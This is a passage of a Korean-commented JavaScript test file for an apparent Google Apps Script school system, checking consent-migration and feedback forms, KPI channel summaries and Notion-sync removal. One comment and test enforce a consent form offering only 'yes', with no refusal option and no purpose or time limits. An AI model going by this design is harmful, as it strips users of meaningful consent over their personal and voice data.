  // 08-26 노션 동기화 179줄 소각으로 구 시험 「[v9.84] 노션 상담서술 이관」이 과녁을 잃었다.
  //   그 시험이 «노션 밖»에서도 지키던 것 셋만 여기로 옮긴다 — 통째로 지우면 동의 게이트가 무방비가 된다.
  //   ⚠ 지운 것 = syncToNotion_ 순서 검사·notionEnsureProp_ 타입 충돌·consultNarrativeMap_ blob 조인.
  //     그 함수들이 이제 없다(유호 기결정 삭제 확정 · 노션 워크스페이스는 2026-08-04 전량 삭제).

  // ① 동의 마커 제목이 단일 소스인가 — 두 곳에 적히면 한쪽만 바뀌어 전 행이 조용히 미동의로 분류된다
  assert.ok(code.includes("const CONSENT_Q_TITLE = '개인정보·학습데이터 활용 동의'"),
    '동의 마커 제목 상수가 없다/변형됨');
  assert.equal((code.match(/'개인정보·학습데이터 활용 동의'/g) || []).length, 1,
    '동의 제목 리터럴이 2곳 이상 — 단일 소스가 깨졌다');

  // ② 마이그레이션 문항 A 제목이 그 상수를 «쓰는가»(하드코딩 금지)
  assert.ok(code.includes('const A = CONSENT_Q_TITLE'),
    'V186 문항 A 제목이 마커 상수를 안 쓴다 — 한쪽만 바뀌면 모든 행이 조용히 미동의가 된다');

  // ③ 상담 소스 헤더 6종 워치독 — 이름 개명이 「조용한 전부 빈칸」으로 착지하는 것을 주간 발각한다.
  //   ⚠ '📝자유서술→노션' 은 **시트 열 이름**이라 노션이 죽어도 그대로다 —
  //     엔진_운영배치.js 가 강사 뷰 「한국어고충」을, 엔진_폼리포트 가 서술형 문항 착지를 이 열에 건다.
  assert.ok(code.includes("['TOPIK목표', 'TOPIK목표기한', 'TOPIK급수', 'TOPIK점수', '학습가능시간', '📝자유서술→노션']"),
    '워치독 소스 헤더 검사 배열이 없다/변형됨');

  // ④ 소각이 실제로 끝났는가 — 되살아나면 여기서 잡힌다(🚫부활 금지 · 전수분석 시11)
  assert.ok(!code.includes('function syncToNotion_'), '노션 동기화가 되살아났다 — 유호 기결정 삭제 확정이다');
  assert.ok(!code.includes('NOTION_DB_ID'), '노션 DB 상수가 되살아났다');
});

test('[v9.84] KPI 인지채널 분해 — 이름 해석·집계·리포트 1줄·시트 스키마 불변 + 정렬 실행 검증', () => {
  const body = section('function computeKpiMetrics', 'function kpiChannelLine_');
  assert.ok(body.includes(".indexOf('인지채널')"), '인지채널 헤더 이름 해석이 없다');
  assert.ok(body.includes('chConsult[ch] = (chConsult[ch] || 0) + 1'), '채널 집계가 없다');
  assert.ok(body.includes('const rowArr = [ym, openingN, newReg.length, churn, churnRate, consultCnt, convCnt, convRate, calcStamp, confirmVal]'),
    'KPI 시트 rowArr가 변형됨 — 스키마 불변 원칙 위반(아카이브 열 밀림)');
  assert.ok(code.includes("'· 채널별 등록/상담: ' + chLine"), '주간 KPI 섹션 채널 줄이 없다');
  const lineF = loadFunction('function kpiChannelLine_', '// 주간 통합 리포트 섹션', 'kpiChannelLine_', {});
  const out = lineF({ chConsult: { A: 5, B: 2, C: 9, D: 1, E: 1, F: 1 }, chConv: { B: 2, A: 1 } });
  assert.ok(out.indexOf('B 2/2') === 0, '등록 많은 채널이 앞이 아니다: ' + out);
  assert.equal(out.split(' · ').length, 5, '상위 5 컷이 아니다: ' + out);
  assert.equal(lineF({ chConsult: {}, chConv: {} }), '', '채널 0건인데 빈 문자열이 아니다');
});

test('[v9.90] 동의 마이그레이션(v18.6) — 멱등·명시 동의·거부 가능·열 착지·▶ 전용·워치독 게이트', () => {
  const body = section('function migrateConsentV186()', 'function voiceConsentStat_()');
  // [v9.98] 제목이 CONSENT_Q_TITLE 상수로 단일화됨(그 제목이 곧 blob의 행 단위 동의 마커라 하드코딩 2곳은 표류 위험) — 의도는 동일: 문항 A가 그 제목으로 존재하는가
  assert.ok(body.includes('const A = CONSENT_Q_TITLE'), '문항 A(개인정보·필수)가 없다');
  assert.ok(code.includes("const CONSENT_Q_TITLE = '개인정보·학습데이터 활용 동의'"), '동의 제목 상수가 없다/변형됨');
  assert.ok(body.includes("['네, 동의합니다']"), '명시적 동의 선택지가 없다');
  /* [v9.138] 문구가 함수 밖 상수로 승격됐다(A=CONSULT_CONSENT_HELP · B=VOICE_CONSENT_HELP) — 그래서 이 테스트는
   *   "함수가 그 정본을 쓰는가"만 지키고, 문장 내용(철회·범위·비식별)의 **조립 결과 검사**는
   *   tests/발화퀄리티.test.js가 실값으로 한다. 여기서 문자열을 또 세면 두 곳이 갈라진다. */
  assert.ok(body.includes('동의문구_(CONSULT_CONSENT_HELP, CONSENT_HELP_A_MN)'), '문항 A가 문구 정본 상수를 쓰지 않는다(함수 안 하드코딩은 개정이 라이브에 안 닿는다)');
  assert.ok(/const CONSULT_CONSENT_HELP[\s\S]{0,1200}?철회/.test(code), '동의 철회 안내가 문구 정본(A)에 없다(문구 초안 필수 요소)');
  // [v9.90 핵심] 음성 동의는 blob이 아니라 '열'로 받는다 — 열이 없으면 "누가 거부했는지"를 코드가 못 읽어 녹음이 거부자까지 삼킨다
  assert.ok(code.includes("const CONSENT_EXT_HEADERS = ['음성동의']"), '음성동의 착지 헤더 상수가 없다/변형됨');
  assert.ok(body.includes('const B = CONSENT_EXT_HEADERS[0]'), '문항 B 제목이 헤더명 상수를 쓰지 않는다(제목≠헤더면 열에 착지하지 않는다)');
  /* [v18.9 · 2026-08-03 유호 결정] 구 검사는 **거부 선택지의 존재를 요구**했다(끼워팔기 무효 리스크 회피).
   *   유호님이 방향을 바꿨다 — 처음 만나는 사용자부터 전부, 목적·기간 제한 없이 받는다. 그래서 이 검사는
   *   「거부 가능한가」를 묻지 않는다. 대신 **선택지가 정본 상수 한 곳에서 나오는지**를 지킨다:
   *   A·B가 각자 하드코딩되면 다음 개정 때 한쪽만 바뀌어 조용히 갈라진다(구 구조의 실패 유형). */
  assert.ok(body.includes("const 동의선택 = ['네, 동의합니다']"), '동의 선택지 단일 소스가 없다/변형됨');
  assert.equal((body.match(/setChoiceValues\(동의선택\)/g) || []).length, 2, '두 문항이 선택지 정본 상수를 쓰지 않는다(하드코딩은 개정 때 한쪽만 바뀐다)');
  assert.ok(/const B = CONSENT_EXT_HEADERS\[0\][\s\S]*setRequired\(true\)/.test(body), '음성 동의가 필수 응답이 아니다(무응답이면 게이트가 침묵으로 통과된다)');
  /* [v18.9] 라이브에 이미 선 폼은 syncHelp 경로로만 지나간다 — 도움말만 고치면 화면엔 옛 선택지가
   *   남은 채 함수는 "갱신했습니다"라고 보고한다(참인 채 거짓을 말하는 형태). 선택지도 맞추는지 검사. */
  assert.ok(/const syncHelp = \([\s\S]{0,700}?setChoiceValues\(choices\)/.test(body), 'syncHelp가 기존 폼의 선택지를 정본으로 맞추지 않는다 — 개정이 라이브 화면에 닿지 않는다');
  assert.ok(/syncHelp\(titles\.indexOf\(A\)[^;]*동의선택\)/.test(body) && /syncHelp\(titles\.indexOf\(B\)[^;]*동의선택\)/.test(body), '두 문항의 syncHelp 호출이 선택지 정본을 넘기지 않는다');
  // 시트 열 증분이 실패하면 판 번호를 선언하지 않는다 — 폼 문항만 있고 열이 없는 상태를 "적용됨"으로 오인하면 거부자를 못 읽는다
  assert.ok(body.includes("if (sheetOk) setState(st, '상담동의', CONSENT_VERSION)"), '시트 증분 성공 조건부 선언이 아니다(또는 판 번호가 하드코딩됐다)');
  assert.ok(body.includes('학생ID') && body.includes('증분 중단'), '상담시트 스키마 가드(60열=학생ID)가 없다');
  const calls = (code.match(/migrateConsentV186\(\)/g) || []).length;
  assert.equal(calls, 1, '▶ 전용이어야 하는 동의 마이그레이션이 코드 어딘가에서 자동 호출된다(정의 1회 외 호출 ' + (calls - 1) + '건)');
  assert.ok(code.includes("String(getState(stV, '상담동의').val || '') === CONSENT_VERSION"), '워치독 동의 미적용 감시 게이트가 없다(또는 판 번호가 하드코딩됐다)');
  /* [v9.138] 판 번호 단일 소스 — 선언 1곳 + 게이트 2곳(워치독·노션)이 같은 상수를 보는지 **결과로** 확인한다.
   *   조각 검사만 하면 "상수는 있는데 어디선가 아직 리터럴을 비교" 하는 상태를 통과시킨다(guard-must-check-result 교훈).
   *   허용 예외: 주석의 역사 기록('v18.5→v18.6' 같은 경위 서술)은 실행 경로가 아니므로 센다면 오탐이 된다 → 코드 줄만 본다. */
  const 판리터럴 = code.split('\n')
    .filter(l => !/^\s*(\/\/|\*|\/\*)/.test(l))          // 주석 줄 제외(경위 서술은 남겨둬야 한다)
    .filter(l => /'상담동의'/.test(l) && /'v18\.\d/.test(l));
  assert.equal(판리터럴.length, 0, '동의 판 번호가 실행 코드에 하드코딩돼 있다(CONSENT_VERSION을 써야 한다): ' + 판리터럴.join(' ⏎ '));
  // [v19.0] 대역을 v18 로 못 박아 뒀더니 판을 올리는 순간 빨개졌다 — 검사할 것은 대역이 아니라 **단일 소스**다
  assert.ok(/const CONSENT_VERSION = 'v\d+\.\d/.test(code), 'CONSENT_VERSION 단일 소스 정의가 없다');
  // 구 함수명 잔재 검사 — 역사 기록(설계노트 204·버전 문자열)은 허용하되, 정의와 '▶ 실행 지시'는 남아 있으면 안 된다(없는 함수를 유호님이 누른다)
  assert.ok(!코드정제.includes('function migrateConsentV185'), '구 함수 정의(V185)가 남아 있다');
  assert.ok(!코드정제.includes('migrateConsentV185 ▶'), '구 함수 ▶ 실행 안내가 남아 있다 — 유호님이 없는 함수를 실행하게 된다');
});

test('[v9.90] 🛂 면접 기록 폼 — 재실행 안전·익명 회수·활용 동의·핵심 칸·워치독 편입', () => {
  const body = section('function createInterviewLogForm()', 'function importFormResponses()');
  // 재실행 안전 — 살아 있는 폼이 있으면 절대 새로 만들지 않는다(배포된 링크·QR가 미아가 되는 사고 방지, createConsultForm 리뷰 M1 계보)
  // 생성(FormApp.create)은 반드시 ①ID 조회 ②응답 탭 복구 ③기존 폼 열기를 모두 지나친 뒤에만 온다
  assertOrder(body, ["getState(st, '면접폼ID')", 'shR.getFormUrl()', 'FormApp.openById(exId)', 'FormApp.create(']);
  assert.ok(body.includes("setState(st, '면접폼ID'") && body.includes("setState(st, '면접폼URL'"), '생성 후 폼 ID·URL 저장이 없다');
  assert.ok(body.includes('새 폼을 만들지 않았습니다'), '폼 열기 실패 시 재생성 차단 경로가 없다');
  assert.ok(body.includes('연결 폼에서 복구'), 'ID 유실 시 응답 탭에서 복구하는 경로가 없다 — 중복 폼이 생겨 회수가 두 곳으로 갈린다');
  // 익명 회수 — 이름·연락처가 필수면 거절 경험(가장 값진 자료)이 안 들어온다
  assert.ok(!/txt\('이름', true/.test(body) && !/txt\('연락처', true/.test(body), '이름·연락처가 필수다 — 익명 회수가 막힌다');
  // 자료 활용 동의 = 필수 + 거부 가능. 없으면 모은 기록을 연습 자료로도 AI 학습으로도 못 쓴다(소급 불가)
  assert.ok(/mc\('자료활용동의', \['네, 동의합니다', '아니요, 원하지 않습니다'\], true/.test(body), '자료 활용 동의가 필수·거부 가능 형태가 아니다');
  // 핵심 칸 2개 — 질문 은행과 모순 탐지 채점표의 원료
  assert.ok(/para\('받은 질문 전부', true/.test(body), "'받은 질문 전부'가 필수 문항이 아니다(질문 은행의 유일한 원천)");
  assert.ok(body.includes("para('다시 물어보거나 서류를 지적한 부분'"), '재질문·서류 지적 칸이 없다(합격과 거절을 가르는 지점)');
  assert.ok(body.includes("mc('면접 종류', INTERVIEW_KINDS, true)") && body.includes("mc('결과',"), '면접 종류·결과 분류 문항이 없다');
  assert.ok(body.includes("linkFormTab_(ss, before, '면접기록_응답')"), '응답 탭 연결이 없다');
  // 워치독 — 폼 생존 + 회수량(개발 준비도)
  assert.ok(code.includes("['면접폼ID', '면접 기록 폼(비자·취업)'"), '워치독 폼 생존 큐에 면접폼이 없다');
  assert.ok(code.includes("ss.getSheetByName('면접기록_응답')"), '워치독 회수 건수 표기가 없다');
});

test('[v9.268] 🧰 직장 경험 폼 — 재실행 안전·익명 회수·활용 동의·«방해» 칸·워치독 편입', () => {
  const body = section('function createWorkLogForm()', 'function absenceFormSpec_(');
  // 재실행 안전 — 면접 폼과 같은 계급(살아 있는 폼은 절대 새로 만들지 않는다 · 배포된 링크·QR 미아 방지)
  assertOrder(body, ["getState(st, '직장폼ID')", 'shR.getFormUrl()', 'FormApp.openById(exId)', 'FormApp.create(']);
  assert.ok(body.includes("setState(st, '직장폼ID'") && body.includes("setState(st, '직장폼URL'"), '생성 후 폼 ID·URL 저장이 없다');
  // 첫 생성의 동시 실행 창 — 둘이 빈 ID를 동시에 읽으면 폼이 둘 생기고 한쪽이 고아가 된다(①배포 검수 c2e5cccfcc26)
  assert.ok(/LockService\.getScriptLock\(\)/.test(body) && /tryLock\(/.test(body) && /releaseLock\(\)/.test(body), '첫 생성 경합을 막는 스크립트 락이 없다');
  // ID는 «만든 그 자리에서» 저장한다 — 뒤로 미루면 그 사이 실패가 「폼은 있는데 아무도 모르는」 상태를 남긴다.
  //   ⚠ 첫 등장으로 재면 안 된다 — 복구 경로에도 같은 setState 가 있어 언제나 앞선다. 생성 블록만 잘라서 본다.
  const 생성부 = body.slice(body.indexOf('FormApp.create('));
  /* 🔴 «설문지 제목»을 갖고 태어나게 한다(09-03 라이브에서 잡힌 자리) — FormApp.create(제목) 은
   *   문서 제목(Drive 파일 이름)만 세우고 설문지 제목은 비워 둔다. 서명이 읽는 것이 그 설문지 제목이라,
   *   안 채우면 이 폼은 태어나자마자 제 서명에 걸려 «남의 폼»으로 찍힌다(결과 칸 메뉴가 2회 거절당했다). */
  assertOrder(생성부, ["setState(st, '직장폼ID'", 'form.setTitle(WORK_FORM_TITLE)', 'form.setDestination(']);
  assert.ok(body.includes('새 폼을 만들지 않았습니다'), '폼 열기 실패 시 재생성 차단 경로가 없다');
  assert.ok(body.includes('연결 폼에서 복구'), 'ID 유실 시 응답 탭에서 복구하는 경로가 없다 — 중복 폼이 생겨 회수가 두 곳으로 갈린다');
  // 익명 회수 — 이름·연락처가 필수면 「혼났던 경험」(가장 값진 자료)이 안 들어온다
  assert.ok(!/txt\('이름', true/.test(body) && !/txt\('연락처', true/.test(body), '이름·연락처가 필수다 — 익명 회수가 막힌다');
  // 자료 활용 동의 = 필수 + 거부 가능. 없으면 모은 기록을 연습 자료로도 AI 학습으로도 못 쓴다(소급 불가)
  assert.ok(/mc\('자료활용동의', \['네, 동의합니다', '아니요, 원하지 않습니다'\], true/.test(body), '자료 활용 동의가 필수·거부 가능 형태가 아니다');
  // 핵심 칸 2개 — 실기 회차의 과업과 «방해»의 유일한 원천(설계 §5)
  assert.ok(/para\('시킨 일 그대로', true/.test(body), "'시킨 일 그대로'가 필수 문항이 아니다(과업의 원천)");
  assert.ok(/para\('예정에 없던 일이 생긴 적', true/.test(body), "'예정에 없던 일'이 필수 문항이 아니다 — 방해가 없으면 「할 수 있는가」를 못 잰다(설계 §5)");
  // 채점 축 넷과 1:1 — 축에 안 닿는 문항은 회수율만 먹고, 축이 빠지면 그 축의 채점 기준을 만들 재료가 없다
  assert.ok(body.includes("para('못 알아들었을 때 어떻게 했나요'"), '채점 축 ①(지시 수용) 칸이 없다');
  assert.ok(body.includes("para('그때 누구에게 어떻게 알렸나요'"), '채점 축 ②(보고) 칸이 없다');
  assert.ok(body.includes("para('하지 말라고 들은 것'"), '채점 축 ③(안전·규칙) 칸이 없다');
  assert.ok(body.includes("para('말투·호칭 때문에 곤란했던 일'"), '채점 축 ④(관계 언어) 칸이 없다');
  // 학생ID 는 면접 폼과 같은 상수 — 조인 키라 리터럴로 따로 적으면 두 폼이 한 사람으로 안 묶인다
  // 제목은 면접폼과 «같은 상수»(조인 키) · 안내는 이 폼 전용 — 배포처에 학부모·지인이 있어 자녀 ID를 적을 여지가 있다(①배포 검수 41a05e993ae4)
  assert.ok(body.includes("txt(INTERVIEW_SID_TITLE, false, WORK_HELP['학생ID'])"), '학생ID 제목이 면접폼과 같은 상수가 아니거나 안내문 정본을 안 쓴다');
  assert.ok(/자녀·지인의 번호는 적지 마세요/.test(code), '학생ID 안내에 「자녀·지인 번호를 적지 마라」가 없다 — 남의 경험이 그 학생 궤적으로 조인된다');
  assert.ok(body.includes('linkFormTab_(ss, before, WORK_TAB)'), '응답 탭 연결이 없다');
  // 「ID가 읽힌다」를 완료로 취급하지 않는다 — setDestination 이 실패했으면 폼은 사는데 제출이 어디에도 안 쌓인다(①배포 검수 257ac0b6fe00)
  assert.ok(/if \(!shT\)[\s\S]{0,400}exForm\.setDestination\(/.test(body), '기존 폼 경로에 응답 라우팅 복구가 없다 — 탭이 없으면 제출이 영영 안 쌓인다');
  // 복구한 폼은 제목으로 검증한다 — 탭 이름은 사람이 바꿀 수 있어 엉뚱한 폼이 붙어 있을 수 있다(①배포 검수 695480e24333)
  assert.ok(/직장폼제목_\(f0, true\) === WORK_FORM_TITLE/.test(body), '응답 탭에서 복구한 폼을 제목으로 검증하지 않는다');
  /* 🔴 제목은 «두 곳»에 산다(09-03 라이브 실측) — 설문지 제목(Form.getTitle 이 읽는 것 · 응답자 화면)과
   *   문서 제목(Drive 파일 이름 · 편집 화면 왼쪽 위). FormApp.create 는 문서 제목만 세우므로, getTitle()
   *   하나만 보면 «우리가 방금 만든 폼»이 남의 폼으로 찍힌다. 그래서 자를 직장폼제목_ 하나로 모았다.
   *   여기서 못박는 것은 그 자가 «느슨해지지 않는다»는 것 — 아래 셋이 무너지면 남의 폼이 그 문으로 들어온다. */
  // 자르는 손잡이에 닫는 괄호를 넣지 않는다 — 인자가 늘면 못 찾고, 못 찾으면 slice(-1) 이 «엉뚱한 꼬리»를 잰다
  const 제목자머리 = code.indexOf('function 직장폼제목_(form');
  assert.ok(제목자머리 !== -1, '직장폼제목_ 를 못 찾았다 — 이름이 바뀌었으면 아래 검사가 전부 헛돈다');
  const 제목자 = code.slice(제목자머리, code.indexOf('function 직장폼제목치유_'));
  assert.ok(/if \(t\) return t;[\s\S]{0,200}DriveApp\.getFileById/.test(제목자),
    '직장폼제목_ 가 «설문지 제목이 빌 때만» 문서 제목을 보는 구조가 아니다 — 이러면 자가 느슨해진다');
  assert.ok(/catch \(e\) \{ return ''; \}/.test(제목자),
    '직장폼제목_ 가 제목을 못 읽을 때 빈 문자열(=거절)로 안 떨어진다');
  /* [①배포 검수 854bb25d87cb 채택] 읽기 «둘 다» try 안이라야 「못 읽으면 거절」이 참이 된다 — 첫 판은
   * getTitle() 이 try 밖이어서 그 호출이 던지면 거절이 아니라 «예외»로 튀었다(주석과 이 회귀는 거절을
   * 약속하고 있었다 · 약속과 물건이 갈린 자리). 위 두 줄만으로는 그 갈림을 못 본다. */
  assert.ok(/try \{[^\r\n]*form\.getTitle\(\)/.test(제목자),
    '직장폼제목_ 의 설문지 제목 읽기가 try 밖이다 — 그 호출이 던지면 「거절」이 아니라 예외로 튄다');
  const 서명자머리 = code.indexOf('function 직장폼서명_(form');
  assert.ok(서명자머리 !== -1, '직장폼서명_ 를 못 찾았다 — 이름이 바뀌었으면 아래 읽기전용 검사가 헛돈다');
  const 서명자 = code.slice(서명자머리, code.indexOf('function createWorkLogForm()'));
  assert.ok(!/setTitle\(|setDescription\(|setHelpText\(|setState\(/.test(서명자),
    '서명 자가 폼에 «쓰고» 있다 — 워치독(엔진_콘텐츠AI.js)이 매 점검마다 부르는 자리라 읽기 전용이어야 한다');
  /* [①배포 검수 947f3f044f72 채택] 치유는 갈래 «셋»을 갈라 말한다 — 이미 서 있음('') · 채웠음 · 못 채웠음.
   * 첫 판은 실패도 '' 를 내서 조용히 성공으로 읽혔다(0건이 성공 얼굴을 쓰는 자리). 쓴 «뒤 다시 읽어» 확인한다. */
  /* ⚠ 끝 손잡이에도 닫는 괄호를 안 넣는다 — 못 찾으면 indexOf 가 -1 이고 slice(시작, -1) 은 «파일 끝까지»를
   * 잘라서, 아래 검사들이 엉뚱하게 넓은 범위를 보며 조용히 통과한다(자가 망가져도 초록인 자리). */
  const 치유자끝 = code.indexOf('function 직장폼서명_(form');
  assert.ok(치유자끝 !== -1, '직장폼서명_ 를 못 찾아 치유 자의 범위를 못 자른다');
  const 치유자 = code.slice(code.indexOf('function 직장폼제목치유_(form)'), 치유자끝);
  assert.ok(/setTitle\(WORK_FORM_TITLE\);[\s\S]{0,120}getTitle\(\)/.test(치유자),
    '제목 치유가 쓴 «뒤 다시 읽어» 확인하지 않는다 — 쓰기가 안 먹어도 「고쳤다」로 보고된다');
  assert.ok(/catch \(e\) \{[\s\S]{0,120}⚠️/.test(치유자),
    '제목 치유의 쓰기 실패가 조용하다 — 실패와 「이미 서 있음」이 같은 모양이면 안 된다');
  assert.ok(/try \{[^\r\n]*form\.getTitle\(\)/.test(치유자),
    '직장폼제목치유_ 의 제목 읽기가 try 밖이다 — 그 호출이 던지면 「고치러 온 통로」가 통째로 죽는다');
  /* [①배포 검수 eb8c0edb35dc 채택] 사람에게 보이는 줄에는 «보임» 자를 쓴다 — 판정용 자는 빈 문자열을
   * 내므로 그대로 찍으면 「제목 「」」가 된다. 유호님이 09-03 에 보신 그 화면이 정확히 이 자리다. */
  assert.ok(!/제목 「' \+ 직장폼제목_\(/.test(code),
    '거절 문구가 판정용 자를 그대로 찍는다 — 못 읽거나 비었을 때 빈 「」 가 다시 뜬다');
  /* 보임 자는 판정 자를 «그대로» 감싼다 — 곁다리 켜짐(탭연결확인됨)까지 같이 넘겨야 화면과 판정이 안 갈린다. */
  assert.ok(/function 직장폼제목보임_\(form, 탭연결확인됨\)[\s\S]{0,160}직장폼제목_\(form, 탭연결확인됨\) \|\|/.test(code),
    '보임 자가 없거나 판정 자를 안 감싼다 — 두 자가 갈리면 화면과 판정이 어긋난다');
  // 표준 탭 이름이 이미 차 있으면 새 폼을 만들지 않고 멈춘다 — 접미사 탭이 되면 회수량이 워치독에서 사라진다(①배포 검수 10a5f2f323f0)
  assert.ok(/if \(ss\.getSheetByName\(WORK_TAB\)\)[\s\S]{0,600}return mT;/.test(body), '탭 이름 충돌 시 생성을 멈추는 가드가 없다');
  /* 탭이 «이 폼의» 탭인지 대조한다 — 옛 탭·재생성된 탭이면 제출처와 워치독이 갈라진다(①배포 검수 0b240aac65cc).
   * 🔑 그 URL 은 «한 번만» 읽고 값을 남긴다(①배포 검수 7887232d1d77) — 두 번 읽으면 두 값이 갈리고,
   *   안 남기면 아래 안내가 「탭이 있나」 하나로 되돌아간다(이번 결함의 뿌리). 읽기 실패는 따로 잡는다. */
  assert.ok(/try \{ 탭연결URL = String\(shT\.getFormUrl\(\) \|\| ''\); \} catch \(eU\) \{ 탭연결못읽음 = true; \}/.test(body),
    '탭의 연결 폼 URL 을 한 번 읽어 변수에 두지 않거나, 읽기 실패를 «못 읽음»으로 따로 안 잡는다');
  assert.ok(/const tabOk = !!탭연결URL && 탭연결URL\.indexOf\(exForm\.getId\(\)\) !== -1;/.test(body),
    '응답 탭이 그 폼의 것인지 대조하지 않는다 — 판정이 읽어 둔 URL 과 폼 ID 로 서지 않는다');
  /* 「만들다 만 폼」을 완성으로 보고하지 않는다(①배포 검수 d9047521dc41) — ID 는 폼을 만든 다음 줄에서
   * 적으므로(고아 방지) 문항을 붙이는 도중 끊기면 「ID 는 있는데 문항이 빠진 폼」이 남는다.
   * 그래서 완료 표식이 «맨 마지막»에 찍히고, 기존 폼 경로가 그 표식을 확인한다. 둘 다 있어야 짝이 산다. */
  assert.ok(/getState\(st, '직장폼완료'\)\.val \|\| ''\) !== 'y'/.test(body), '기존 폼 경로가 완료 표식을 확인하지 않는다 — 문항이 빠진 폼을 완성으로 보고한다');
  /* 검증 «순서»가 곧 판정이다(①배포 검수 9675a3471a43·132ede0b00a2): ①이게 그 폼인가(제목) ②완성됐나(표식)
   * ③탭이 붙었나(라우팅). 완성을 먼저 안 보면 «문항이 빠진 폼»에 탭만 달아 놓고 「복구했다」고 보고한다. */
  const 기존경로 = body.slice(body.indexOf('const exForm = FormApp.openById(exId);'));
  /* [①배포 검수 ed44cb1528a8 채택] ②완성됐나 «뒤»에 ②-b 서명을 하나 더 세운다 — 제목 대조는 설문지
   * 제목이 비면 문서 제목(남이 붙일 수 있는 이름)으로 떨어지므로, 완료 표식까지 있는 남의 폼이
   * 정상으로 지나갈 수 있었다. 서명을 «완료 뒤»에 두는 것이 곧 판정이다 — 앞에 두면 문항을 붙이다
   * 끊긴 우리 폼(서명 없음)이 「만들다 만 상태」 안내 대신 「남의 폼」으로 찍힌다. */
  assertOrder(기존경로, ['const shT = ss.getSheetByName(WORK_TAB)', 'if (!설문지제목 && !tabOk)', '직장폼제목_(exForm, tabOk) !== WORK_FORM_TITLE', "getState(st, '직장폼완료')", '직장폼서명_(exForm, tabOk)']);
  /* 🔴 [①배포 검수 08515c3f7f53·61e7fc738d02 채택] 증거가 약하면 «기계가 정하지 않는다».
   * 설문지 제목이 비고 응답 탭도 없으면 남는 증거는 파일 이름뿐인데, 그건 누구나 같게 지을 수 있다.
   * 필수 문항 다섯으로 대신 재보는 길도 있었지만 그것도 «제목 문자열»이라 섹션 머리·선택 문항으로
   * 흉내 낼 수 있었다 — 형상을 파고들수록 흉내의 문턱만 조금씩 오른다.
   * ⇒ 약한 증거를 짜내는 대신 사람에게 한 줄을 부탁한다. 그 한 줄이면 «엄격한 길»로 그냥 지나간다. */
  assert.ok(/if \(!설문지제목 && !tabOk\)/.test(기존경로) && /getEditUrl\(\)/.test(기존경로),
    '설문지 제목도 탭도 없을 때 사람에게 «폼을 열어 제목을 적으라»고 안 알린다 — 되살릴 길이 0 이 된다');
  assert.ok(!/WORK_REQUIRED_\.every\(/.test(기존경로),
    '탭 없는 경로가 문항 제목 문자열만으로 신원을 «대신» 재고 있다 — 섹션 머리·선택 문항으로 흉내 난다');
  /* 🔴 [①배포 검수 7887232d1d77(P2)·656171cbbd8c(P3) 채택] 탭의 사정은 «넷»인데 말이 «둘»이었다.
   * 판정(tabOk)은 getFormUrl() 로 재면서 안내 문구는 그걸 안 보고 「탭이 있나」만 봤다 — 그래서
   * 어느 폼에도 «안 붙은» 시트(이름만 같은 보통 시트 · getFormUrl() 이 던진 자리)를 「다른 폼에
   * 연결돼 있습니다」로 말했다. 붙은 폼이 없는데 그걸 찾아가라니, 따라갈 수 없는 처방이다.
   * 🔑 여기서 재는 것은 판정이 아니라 «말»이다 — 넷을 실제로 넣어 보고 넷이 다 다른 말을 내는가.
   *   문구 정규식으로 재면 문구를 다듬는 순간 죽고, 뭉쳐 있어도 초록이 난다. 갈래를 «골라» 결과를 본다.
   * ⚠ 손잡이에 닫는 괄호를 안 넣는 규율 그대로 — 못 찾으면 여기서 멈춘다(조용히 넓게 자르지 않는다). */
  const 탭이름 = (code.match(/const WORK_TAB = '([^']+)'/) || [])[1];
  assert.ok(탭이름, 'WORK_TAB 정본을 못 읽었다 — 테스트가 탭 이름을 하드코딩하면 정본이 바뀔 때 검사만 조용히 낡는다');
  const 탭말시작 = 기존경로.indexOf('let 탭말;');
  assert.notEqual(탭말시작, -1, '탭 사정을 고르는 블록(let 탭말;)이 없다 — 삼항 하나로 되돌아갔으면 사정이 다시 뭉친다');
  const 탭말끝 = 기존경로.indexOf('const mL =', 탭말시작);
  assert.notEqual(탭말끝, -1, '탭 사정 블록의 끝 손잡이(const mL =)를 못 찾았다 — 범위를 못 자르면 아래가 헛돈다');
  const 탭말고르기 = new Function('shT', '탭연결못읽음', '탭연결URL', 'WORK_TAB',
    기존경로.slice(탭말시작, 탭말끝) + '\nreturn 탭말;');
  const 남의폼URL = 'https://docs.google.com/forms/d/OTHER_FORM_ID/edit';
  const 탭사정 = {
    '탭 없음': 탭말고르기(null, false, '', 탭이름),
    '어느 폼에도 안 붙음': 탭말고르기({}, false, '', 탭이름),
    '연결을 못 읽음': 탭말고르기({}, true, '', 탭이름),
    '다른 폼에 붙음': 탭말고르기({}, false, 남의폼URL, 탭이름),
  };
  Object.keys(탭사정).forEach((k) => assert.ok(String(탭사정[k] || '').trim(), '탭 사정 「' + k + '」이 빈 말을 낸다'));
  assert.equal(new Set(Object.keys(탭사정).map(k => 탭사정[k])).size, 4,
    '탭 사정 넷이 서로 다른 말을 내지 않는다 — 뭉치면 유호님이 엉뚱한 곳을 고치신다: ' + JSON.stringify(탭사정, null, 1));
  ['탭 없음', '어느 폼에도 안 붙음', '연결을 못 읽음'].forEach((k) => {
    assert.ok(!/다른 폼/.test(탭사정[k]),
      '탭 사정 「' + k + '」을 「다른 폼」이라 말한다 — 붙은 폼이 없는데 찾아가라는 처방이 된다: ' + 탭사정[k]);
  });
  assert.ok(/다른 폼/.test(탭사정['다른 폼에 붙음']), '진짜 «다른 폼»인 자리를 「다른 폼」이라 말하지 않는다');
  /* 같은 결함이 아래 「탭 대조 실패」 안내에도 있었다 — 여기 오는 탭은 «있는» 탭이라 사정이 셋인데
   * (못 읽음 · 어디에도 안 붙음 · 다른 폼) 말은 하나였다. 처방이 갈린다: 탭의 「양식」 메뉴는 «폼에 붙은»
   * 탭에만 있어서, 이름만 같은 보통 시트에 그걸 시키면 유호님이 없는 메뉴를 찾으신다. */
  const mM시작 = 기존경로.indexOf('let mM;');
  assert.notEqual(mM시작, -1, '탭 대조 실패 안내가 사정별로 안 갈린다(let mM; 이 없다)');
  const mM끝 = 기존경로.indexOf('Logger.log(mM);', mM시작);
  assert.notEqual(mM끝, -1, '탭 대조 실패 안내의 끝 손잡이(Logger.log(mM);)를 못 찾았다');
  const mM고르기 = new Function('탭연결못읽음', '탭연결URL', 'WORK_TAB',
    기존경로.slice(mM시작, mM끝) + '\nreturn mM;');
  const 대조실패 = {
    '연결을 못 읽음': mM고르기(true, '', 탭이름),
    '어느 폼에도 안 붙음': mM고르기(false, '', 탭이름),
    '다른 폼에 붙음': mM고르기(false, 남의폼URL, 탭이름),
  };
  assert.equal(new Set(Object.keys(대조실패).map(k => 대조실패[k])).size, 3,
